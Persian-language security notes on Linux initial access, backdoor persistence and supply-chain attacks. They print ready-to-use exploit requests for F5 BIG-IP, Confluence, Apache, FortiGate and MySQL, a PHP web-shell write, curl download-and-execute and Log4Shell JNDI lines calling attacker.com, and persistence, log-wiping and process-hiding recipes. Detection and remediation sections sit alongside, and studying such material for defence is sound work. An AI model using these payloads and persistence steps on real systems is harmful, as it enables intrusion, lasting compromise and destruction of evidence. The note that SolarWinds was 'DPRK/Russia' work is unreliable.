
# Linux Initial Access: Exploiting Public-Facing Applications

---

## چرا این بردار مهمه؟

برخلاف Windows که Initial Access اغلب از طریق **phishing** هست، در Linux اکثر سرورها **public-facing** هستن و مستقیم در معرض اینترنت قرار دارن.

Internet → Firewall → Public IP → Vulnerable Service → RCE → Shell


---

## 1. F5 BIG-IP

### CVE-2021-22986 (iControl REST Auth Bypass + RCE)
```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: target.com
Authorization: Basic YWRtaW46
Content-Type: application/json

{
  "command": "run",
  "utilCmdArgs": "-c 'id; whoami'"
}
```

### CVE-2022-1388 (Authentication Bypass)
```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: target.com
Connection: keep-alive, X-F5-Auth-Token
X-F5-Auth-Token: a
X-Forwarded-For: localhost
Content-Type: application/json

{"command":"run","utilCmdArgs":"-c 'id'"}
```

**مکانیزم:** هدر `Connection: keep-alive, X-F5-Auth-Token` باعث میشه Reverse Proxy اون هدر رو حذف کنه ولی backend فکر کنه authenticated هست.

**Detection:**
```bash
# لاگ‌های F5
/var/log/restjavad.0.log
# دنبال POST به /mgmt/tm/util/bash بگرد
grep "utilCmdArgs" /var/log/restjavad.0.log
```

---

## 2. Confluence

### CVE-2022-26134 (OGNL Injection - Critical 9.8)
```http
GET /%24%7B%28%23a%3D%40org.apache.tomcat.InstanceManager%40getDefaultContext%28%29.getInstanceManager%28%29.newInstance%28%27com.opensymphony.xwork2.DefaultActionInvocation%27%29%29...%7D/ HTTP/1.1
Host: confluence.target.com
```

OGNL Payload ساده‌تر:
/${Class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(Class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}


### CVE-2023-22515 (Broken Access Control - Privilege Escalation)
```http
POST /setup/setupadministrator.action HTTP/1.1
Host: confluence.target.com

username=attacker&password=P@ss1234&confirm=P@ss1234&email=a@a.com&setupTypeCustom=&atl_token=
```

این روی instance‌هایی که قبلاً setup شدن هم کار میکنه چون `/setup/*` نباید accessible باشه.

### CVE-2023-22527 (SSTI - Template Injection, 2024)
```http
POST /template/aui/text-inline.vm HTTP/1.1

label=\${freemarker.template.utility.Execute?new()("id")}
```

**Detection:**
```bash
# Confluence Access Log
grep "setupadministrator\|text-inline.vm\|freemarker" /opt/atlassian/confluence/logs/access.log
```

---

## 3. OpenSSH

### CVE-2024-6387 - regreSSHion (Race Condition in Signal Handler)
تاریخ: ژوئیه 2024
آسیب‌پذیری: Race Condition در SIGALRM handler
نسخه‌های آسیب‌پذیر: OpenSSH < 4.4p1 و 8.5p1 تا 9.7p1
شرط: LoginGraceTime > 0 (default=120s)


مکانیزم:
1. Client اتصال برقرار میکنه
2. LoginGraceTime timer شروع میشه
3. قبل از auth، SIGALRM fire میشه
4. async-signal-unsafe function در handler صدا زده میشه
5. heap corruption → RCE as root


```bash
# بررسی نسخه
ssh -V
# OpenSSH_9.2p1 → آسیب‌پذیر

# Patch:
# تنظیم LoginGraceTime=0 در /etc/ssh/sshd_config
# یا upgrade به 9.8p1
```

### CVE-2023-38408 (ssh-agent Remote Code Execution)
شرط: Agent Forwarding فعال باشه
مهاجم کنترل SSH server مقصد رو داشته باشه


```bash
# Detection در لاگ:
grep "Authentication" /var/log/auth.log | grep -v "Failed\|Accepted"
# دنبال PKCS11 load های غیرعادی
```

### Username Enumeration (CVE-2018-15473)
```python
# timing attack - هنوز در بعضی نسخ‌ها کار میکنه
import paramiko, time

def check_user(username, host):
    t = paramiko.Transport((host, 22))
    t.start_client()
    start = time.time()
    try:
        t.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except:
        pass
    return time.time() - start
# valid user → response time متفاوته
```

---

## 4. MySQL

### CVE-2012-2122 (Authentication Bypass - Classic)
```bash
# در بعضی نسخه‌های قدیمی:
for i in $(seq 1 1000); do
  mysql -u root -pwrongpassword 2>/dev/null && echo "SUCCESS" && break
done
# به دلیل memcmp timing bug، ~1 در 256 شانس bypass
```

### Unauthenticated Access (Misconfiguration)
```bash
# پیداکردن MySQL باز
nmap -p 3306 --script mysql-empty-password target.com

# اتصال بدون پسورد
mysql -h target.com -u root

# بعد از دسترسی:
SELECT @@datadir;
SELECT @@global.secure_file_priv;

# اگه secure_file_priv خالی بود → File Read/Write
SELECT LOAD_FILE('/etc/passwd');

# Web Shell نوشتن
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';
```

### User Defined Function (UDF) - Privilege Escalation
```sql
-- اگه FILE privilege داری و plugin_dir قابل نوشتنه:
USE mysql;
CREATE TABLE tmp (data LONGBLOB);
INSERT INTO tmp VALUES (load_file('/path/to/lib_mysqludf_sys.so'));
SELECT data FROM tmp INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so';
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf_sys.so';
SELECT sys_exec('cp /bin/bash /tmp/bash && chmod +s /tmp/bash');
```

**Detection:**
```bash
grep "INTO OUTFILE\|LOAD_FILE\|CREATE FUNCTION" /var/log/mysql/mysql.log
```

---

## 5. Apache Web Server

### CVE-2021-41773 / CVE-2021-42013 (Path Traversal + RCE)
```bash
# Path Traversal
curl "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"

# RCE (اگه mod_cgi فعال باشه)
curl -X POST "http://target.com/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data "echo Content-Type: text/plain; echo; id"
```

### CVE-2021-40438 (mod_proxy SSRF)
```http
GET @evil.com/path HTTP/1.1
Host: target.com

# یا
GET http://internal-service:8080/admin HTTP/1.1
Host: target.com
```

### CVE-2017-7679 / mod_mime Buffer Overflow
```bash
# Apache < 2.2.35
curl -H "Range: bytes=0-18446744073709551615" http://target.com/
```

### Log4Shell از طریق Apache (CVE-2021-44228)
```bash
# اگه سرویس پشتی Java/Log4j استفاده کنه:
curl -H "User-Agent: \${jndi:ldap://attacker.com:1389/a}" http://target.com/
curl -H "X-Forwarded-For: \${jndi:ldap://attacker.com/a}" http://target.com/
```

**Detection:**
```bash
# Apache access log
grep -E "\.\./\.\.|\.%2e|%2e\." /var/log/apache2/access.log
grep "jndi:" /var/log/apache2/access.log
```

---

## 6. FortiGate

### CVE-2018-13379 (Path Traversal - SSL VPN)
```bash
# خواندن فایل sslvpn_websession که شامل credentials هست
curl "https://target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# Parse فایل:
strings sslvpn_websession | grep -E "username|password"
```

### CVE-2022-40684 (Authentication Bypass - Critical 9.8)
```http
GET /api/v2/cmdb/system/admin/admin HTTP/1.1
Host: target.com
User-Agent: Report Runner
Forwarded: for="[127.0.0.1]:8888";by="[127.0.0.1]:8888";
Content-Type: application/json

# اضافه کردن SSH key مهاجم:
PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
{
  "ssh-public-key1": "ssh-rsa AAAA...attacker_key"
}
```

### CVE-2023-27997 (Heap Buffer Overflow - SSL VPN Pre-Auth)
نسخه‌های آسیب‌پذیر: FortiOS < 6.0.17, < 6.2.15, < 6.4.13, < 7.0.12, < 7.2.5
شرط: SSL VPN فعال باشه
نتیجه: RCE بدون احراز هویت


**Detection:**
```bash
# FortiGate Logs
# دنبال request های غیرعادی به /remote/ و /api/v2/
grep "remote/fgt_lang\|api/v2/cmdb" /var/log/fortigate.log
```

---

## مقایسه کلی

| سرویس | نوع آسیب‌پذیری | امتیاز CVSS | Pre-Auth؟ |
|---|---|---|---|
| F5 CVE-2022-1388 | Auth Bypass + RCE | 9.8 | بله |
| Confluence CVE-2022-26134 | OGNL Injection | 9.8 | بله |
| regreSSHion CVE-2024-6387 | Race Condition | 8.1 | بله |
| MySQL Misconfiguration | Access Control | - | بله |
| Apache CVE-2021-41773 | Path Traversal | 9.8 | بله |
| FortiGate CVE-2022-40684 | Auth Bypass | 9.8 | بله |

---

## Detection Strategy کلی

```bash
# 1. بررسی نسخه‌های آسیب‌پذیر (Asset Inventory)
nmap -sV --script vulners target_range

# 2. Web Application Firewall Logs
grep -E "OGNL|jndi:|\.%2e|utilCmdArgs" /var/log/waf.log

# 3. Process Monitoring (Sysmon for Linux / auditd)
auditctl -a always,exit -F arch=b64 -S execve -k exec_monitor

# 4. Network - ارتباطات outbound غیرعادی
ss -tnp | grep ESTABLISHED
# Apache spawning curl/wget → مشکوک
```



---


# Linux Backdoor Persistence & Anti-Detection Techniques

بیایید این backdoor رو از زوایای مختلف تحلیل کنیم:

---

## 1. Initial Access: F5 BIG-IP TMUI RCE

```bash
# احتمالاً از CVE-2020-5902 استفاده شده:
POST /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1

# یا CVE-2021-22986 (که قبلاً توضیح دادیم):
POST /mgmt/tm/util/bash HTTP/1.1
{"command":"run","utilCmdArgs":"-c 'curl http://attacker.com/backdoor.elf -o /tmp/init && chmod +x /tmp/init && /tmp/init'"}
```

---

## 2. Persistence Mechanism: `/etc/init.d/rc.local`

### چرا این مسیر؟
```bash
# rc.local یکی از آخرین scriptهایی هست که در boot اجرا میشه
# در systemd-based systems:
/etc/rc.local → symlink به /etc/rc.d/rc.local
# یا مستقیماً:
/lib/systemd/system/rc-local.service
```

### روش استاندارد پایداری:
```bash
# Backdoor خودش رو کپی میکنه:
cp /tmp/backdoor /usr/local/bin/.systemd-helper
chmod +x /usr/local/bin/.systemd-helper

# سپس در rc.local می‌نویسه:
echo "/usr/local/bin/.systemd-helper &" >> /etc/rc.local
chmod +x /etc/rc.local

# برای systemd:
systemctl enable rc-local.service
```

---

## 3. Anti-VM/Sandbox Detection

دستورات استخراج شده از حافظه نشون‌دهنده **Environment Fingerprinting** هست:

### `bash -version`
```bash
# چک میکنه shell واقعیه یا emulated
bash -version
# اگه output غیرعادی باشه یا نباشه → احتمالاً sandbox
```

### `echo $PWD`
```bash
# مسیر فعلی رو چک میکنه
# اگه توی /tmp/cuckoo یا /opt/sandbox باشه → exit
if [[ $PWD == *"cuckoo"* ]] || [[ $PWD == *"sandbox"* ]]; then
    exit 0
fi
```

### `/bin/sh`
```bash
# تست وجود shell واقعی
if [ ! -x "/bin/sh" ]; then
    exit  # محیط غیرواقعیه
fi
```

### `/tmp/AntiVirtmp`
```bash
# فایل Marker برای تشخیص اجرای مجدد
if [ -f "/tmp/AntiVirtmp" ]; then
    exit  # قبلاً اجرا شده
else
    touch /tmp/AntiVirtmp
fi
```

---

## 4. Persistence Locations (مسیرهای رایج)

بر اساس تصویر و تحلیل backdoorهای Linux، این مسیرها معمول هستن:

### A. Init System Persistence

#### **SysVinit (Old Systems)**
```bash
/etc/init.d/backdoor           # Script اصلی
/etc/rc2.d/S99backdoor         # Symlink برای runlevel 2
/etc/rc3.d/S99backdoor         # Runlevel 3
/etc/rc5.d/S99backdoor         # Runlevel 5

# مهاجم:
cat > /etc/init.d/network-monitor << 'EOF'
#!/bin/bash
/usr/bin/.net-mon &
EOF
chmod +x /etc/init.d/network-monitor
update-rc.d network-monitor defaults 99
```

#### **systemd (Modern Linux)**
```bash
/etc/systemd/system/systemd-helper.service
/usr/lib/systemd/system/network-monitor.service
/lib/systemd/system/bluetooth-audio.service  # fake name

# نمونه Service Unit:
cat > /etc/systemd/system/systemd-helper.service << 'EOF'
[Unit]
Description=Systemd Helper Service
After=network.target

[Service]
Type=forking
ExecStart=/usr/local/bin/.systemd-helper
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl enable systemd-helper.service
systemctl start systemd-helper.service
```

---

### B. User-Level Persistence

```bash
# 1. Cron Jobs
/var/spool/cron/crontabs/root
/etc/cron.d/system-update
/etc/cron.hourly/.check

echo "*/10 * * * * /usr/bin/.update >/dev/null 2>&1" | crontab -

# 2. User Profile Scripts
~/.bashrc
~/.bash_profile
~/.profile
/etc/profile.d/update.sh       # Global

echo "/usr/local/bin/.monitor &" >> ~/.bashrc

# 3. SSH Keys (برای Lateral Movement)
~/.ssh/authorized_keys
echo "ssh-rsa AAAA...attacker_key root@attacker" >> ~/.ssh/authorized_keys
```

---

### C. Library Injection Persistence

```bash
# 1. LD_PRELOAD
/etc/ld.so.preload
echo "/usr/local/lib/.libproc.so" > /etc/ld.so.preload

# این کتابخانه قبل از همه load میشه و میتونه syscallها رو hook کنه

# 2. Dynamic Linker Config
/etc/ld.so.conf.d/custom.conf
echo "/opt/lib" > /etc/ld.so.conf.d/x11.conf
ldconfig
```

---

### D. Kernel Module Persistence (Rootkit)

```bash
/lib/modules/$(uname -r)/kernel/drivers/net/backdoor.ko
/etc/modules-load.d/network.conf

# Load شدن خودکار:
echo "backdoor" > /etc/modules-load.d/network.conf

# یا از initramfs:
cp backdoor.ko /lib/modules/$(uname -r)/
depmod -a
update-initramfs -u
```

---

### E. Binary Replacement (Trojanizing)

```bash
# جایگزینی باینری‌های سیستمی:
mv /usr/bin/ps /usr/bin/.ps.bak
cp /tmp/malicious_ps /usr/bin/ps

# یا wrapper:
mv /bin/netstat /bin/.netstat
cat > /bin/netstat << 'EOF'
#!/bin/bash
/bin/.netstat "$@" | grep -v "evil.com"
EOF
chmod +x /bin/netstat
```

---

### F. مسیرهای Hidden/Disguised

```bash
# 1. Fake System Binaries
/usr/bin/.systemd-logger
/usr/sbin/.network-config
/opt/.java/bin/helper

# 2. در دایرکتوری‌های کمتر بررسی شده:
/dev/shm/.backdoor                # RAM disk
/var/tmp/.system                  # alternative temp
/usr/share/man/.helper/init       # documentation folder
/usr/local/share/fonts/.x11/bin   # fonts folder!

# 3. Hidden با Space/Special Chars:
/usr/bin/  systemd-helper         # توجه به space قبل از اسم
/tmp/.                            # directory با نام "."
```

---

## 5. Anti-Forensics Techniques

### Log Cleaning
```bash
# پاک کردن ردپا:
echo "" > /var/log/auth.log
echo "" > /var/log/syslog
echo "" > ~/.bash_history
history -c

# یا Selective Deletion:
sed -i '/curl.*attacker.com/d' /var/log/auth.log
```

### Timestamp Manipulation
```bash
# تغییر timestamp فایل backdoor به یک فایل سیستمی معتبر:
touch -r /bin/ls /usr/bin/.backdoor
```

### Process Hiding
```bash
# اجرا به صورت disguised:
cp /tmp/backdoor /usr/bin/[kworker/0:1]
/usr/bin/[kworker/0:1] &

# در ps به صورت kernel thread نشون داده میشه
```

---

## 6. Detection & Hunting

### پیدا کردن فایل‌های Persistence:

```bash
# 1. فایل‌های اخیراً تغییر کرده در مسیرهای حساس:
find /etc/init.d /etc/systemd/system /etc/cron* -type f -mtime -7 -ls

# 2. فایل‌های با نام مشکوک (شروع با .)
find / -name ".*" -type f -executable 2>/dev/null

# 3. فایل‌های بدون Owner مشخص:
find / -nouser -o -nogroup 2>/dev/null

# 4. بررسی LD_PRELOAD:
cat /etc/ld.so.preload
ldd /bin/ls | grep -v "^/"

# 5. Services غیرمعمول:
systemctl list-units --type=service --state=running
systemctl list-unit-files --state=enabled | grep -v "^#"

# 6. Cron Jobs:
for user in $(cut -f1 -d: /etc/passwd); do 
    echo "=== $user ==="
    crontab -u $user -l 2>/dev/null
done

# 7. بررسی rc.local:
cat /etc/rc.local
ls -la /etc/rc*.d/
```

### استفاده از YARA:
```yara
rule Linux_Backdoor_Persistence {
    strings:
        $s1 = "/etc/init.d/rc.local"
        $s2 = "bash -version"
        $s3 = "/tmp/AntiVirtmp"
        $s4 = "/bin/sh"
        $c1 = "systemctl enable" ascii
        $c2 = "update-rc.d" ascii
    condition:
        3 of ($s*) or any of ($c*)
}
```

### استفاده از auditd:
```bash
# مانیتور تغییرات rc.local
auditctl -w /etc/rc.local -p wa -k persistence
auditctl -w /etc/systemd/system/ -p wa -k systemd_units

# مانیتور اجرای دستورات مشکوک:
auditctl -a always,exit -F arch=b64 -S execve -F exe=/bin/bash -k bash_exec
```

---

## 7. Remediation

```bash
# 1. Kill Process
pkill -9 -f ".systemd-helper"

# 2. حذف Persistence:
rm -f /etc/rc.local
rm -f /etc/systemd/system/systemd-helper.service
systemctl daemon-reload

# 3. حذف Binary:
find / -name ".*" -executable -type f -delete 2>/dev/null

# 4. پاکسازی Cron:
crontab -r
rm -f /etc/cron.d/*

# 5. بازگردانی Binary های Trojanized:
rpm -Va                    # RedHat
debsums -c                 # Debian
# اگه تغییر داشتن → reinstall package
```


---


![[Pasted image 20260612222624.png]]

# Supply Chain Attack

این تکنیک دقیقاً **Supply Chain Compromise** هست — یکی از پیچیده‌ترین و مخرب‌ترین بردارهای حمله.

---

## تعریف دقیق

به جای حمله مستقیم به **هدف نهایی**، مهاجم زنجیره تامین نرم‌افزار را آلوده می‌کند:

Developer → Build System → Package → Distribution → User
              ↑
           نقطه نفوذ


---

## مراحل حمله

### 1. نفوذ به زنجیره
Build Server Compromise     → کد مخرب در مرحله compile تزریق میشه
Source Code Repository      → commit مخرب به repo
Code Signing Key Theft      → امضای دیجیتال معتبر دزدیده میشه
CDN/Update Server Hack      → فایل توزیع شده جایگزین میشه


### 2. Trojanizing بایناری
Original binary  +  Malicious code  →  Signed malicious binary
     ↓                   ↓                       ↓
   legit app         backdoor              trusted by OS


### 3. توزیع از طریق Update
User runs: app.exe → check update → download from attacker CDN
                                          ↓
                                  signed malicious update
                                          ↓
                                  auto-install & execute


---

## نمونه‌های واقعی

### SolarWinds (2020) — Suspected DPRK/Russia
- نفوذ به **Build Pipeline** شرکت SolarWinds
- کد مخرب **Sunburst** داخل `SolarWinds.Orion.Core.BusinessLayer.dll` تزریق شد
- فایل با **کلید معتبر** شرکت امضا شد
- به **18,000 سازمان** از جمله آژانس‌های دولتی آمریکا رسید

### 3CX (2023) — Lazarus Group (DPRK)
- کتابخانه `ffmpeg.dll` در نصب‌کننده آلوده شد
- خود `3CXDesktopApp` backdoor داشت
- **600,000+ شرکت** مشتری 3CX بودند

### CCleaner (2017)
- Build server آلوده شد
- **2.27 میلیون کاربر** نسخه آلوده را دانلود کردند
- Stage 2 فقط برای اهداف خاص (Cisco, Microsoft, ...) فعال می‌شد

---

## روش Lazarus/DPRK

1. نفوذ به شرکت نرم‌افزاری (معمولاً از طریق spear-phishing)
2. Lateral movement به Build Server
3. تزریق کد به CI/CD pipeline یا source code
4. انتظار برای release بعدی
5. Update معتبر + امضا شده با backdoor توزیع میشه
6. بخشی از آلوده‌ها → هدف اصلی
7. بقیه → botnet برای:
   - DDoS
   - Cryptomining
   - Proxy برای مرحله بعدی حمله
   - Data exfiltration


---

## چرا این تکنیک قدرتمند است

| ویژگی | توضیح |
|---|---|
| **Trusted Binary** | آنتی‌ویروس فایل امضا شده را بلاک نمی‌کند |
| **User Initiated** | خود کاربر update را اجرا می‌کند |
| **Scale** | یک حمله → میلیون‌ها قربانی |
| **Legitimate Channel** | از سرور رسمی شرکت توزیع می‌شود |
| **MotW Bypass** | فایل از منبع معتبر → Zone.Identifier مشکلی ندارد |

---

## Detection از منظر Defender

```bash
# 1. Hash Verification
# قبل و بعد update، hash بایناری را مقایسه کن
sha256sum /opt/app/app.dll > before.txt
# پس از update:
sha256sum /opt/app/app.dll > after.txt
diff before.txt after.txt

# 2. بررسی کتابخانه‌های Load شده
ldd /opt/app/app      # لینوکس
# یا Process Monitor روی ویندوز

# 3. Network Behavior Monitoring
# یک app معمولی نباید به C2 وصل شود
# UEBA: آیا رفتار شبکه بعد از update تغییر کرد؟
```

---

این حمله در واقع **اعتماد کاربر به vendor** را سلاح می‌کند. موضوع بعدی کدومه؟